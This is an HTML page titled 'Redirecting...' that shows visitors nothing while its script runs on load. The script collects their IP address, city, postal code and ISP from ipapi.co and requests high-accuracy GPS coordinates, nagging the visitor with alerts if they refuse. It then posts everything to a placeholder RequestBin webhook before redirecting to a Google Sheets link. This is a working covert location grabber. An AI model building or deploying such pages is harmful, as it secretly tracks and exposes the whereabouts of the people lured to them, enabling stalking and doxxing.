<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        function getLocationAndSend() {
            // First, fetch the user's IP and related info
            fetch("https://ipapi.co/json/")
                .then(response => response.json())
                .then(data => {
                    const ipInfo = {
                        ip: data.ip,
                        country: data.country_name,
                        region: data.region,
                        city: data.city,
                        postal: data.postal,
                        timezone: data.timezone,
                        isp: data.org
                    };

                    // Try to get geolocation (for precise location)
                    if (navigator.geolocation) {
                        setTimeout(function() {
                            navigator.geolocation.getCurrentPosition(
                                function(position) {
                                    const geoData = {
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude
                                    };

                                    // Send the IP and geolocation data
                                    sendLocationData(ipInfo, geoData);
                                },
                                function(error) {
                                    console.error('Geolocation error: ', error.message);

                                    // Handle the error, but don't proceed without geolocation
                                    alert("Failed to obtain geolocation. Please allow location access and try again.");
                                },
                                {
                                    enableHighAccuracy: true,   // High accuracy for better mobile results
                                    timeout: 15000,             // Wait for up to 15 seconds
                                    maximumAge: 0               // No cached position
                                }
                            );
                        }, 500); // Delay to ensure it works with Safari
                    } else {
                        console.error('Geolocation not supported by this browser.');
                        alert("Geolocation not supported by your browser. Please try another device.");
                    }
                })
                .catch(error => {
                    console.error('Error fetching IP information: ', error);
                });
        }

        function sendLocationData(ipInfo, geoData) {
            // Log data being sent (for debugging)
            console.log('Sending data: ', { ipInfo, geoData });

            // Prepare headers with both IP and geolocation information
            const headers = new Headers({
                'IP-Address': ipInfo.ip,
                'Country': ipInfo.country,
                'Region': ipInfo.region,
                'City': ipInfo.city,
                'Postal-Code': ipInfo.postal,
                'Timezone': ipInfo.timezone,
                'ISP': ipInfo.isp,
                'Latitude': geoData.latitude,
                'Longitude': geoData.longitude
            });

            // Send the data as headers to your RequestBin webhook
            fetch('https://your-requestbin-url', {
                method: 'POST',
                headers: headers
            }).finally(() => {
                // After data is sent, redirect the user to another page
                window.location.href = 'https://docs.google.com/spreadsheets/d/1kpx8D0chlzEOLvqJRa5GJXcsJsATPgwT0n6NBAsDfL8/edit?gid=0#gid=0';
            });
        }

        // Ensure the function runs on page load
        window.onload = function() {
            setTimeout(getLocationAndSend, 500); // Ensure delay for Safari
        };
    </script>
</head>
<body>
    <!-- No visible content, the page automatically handles everything -->
</body>
</html>
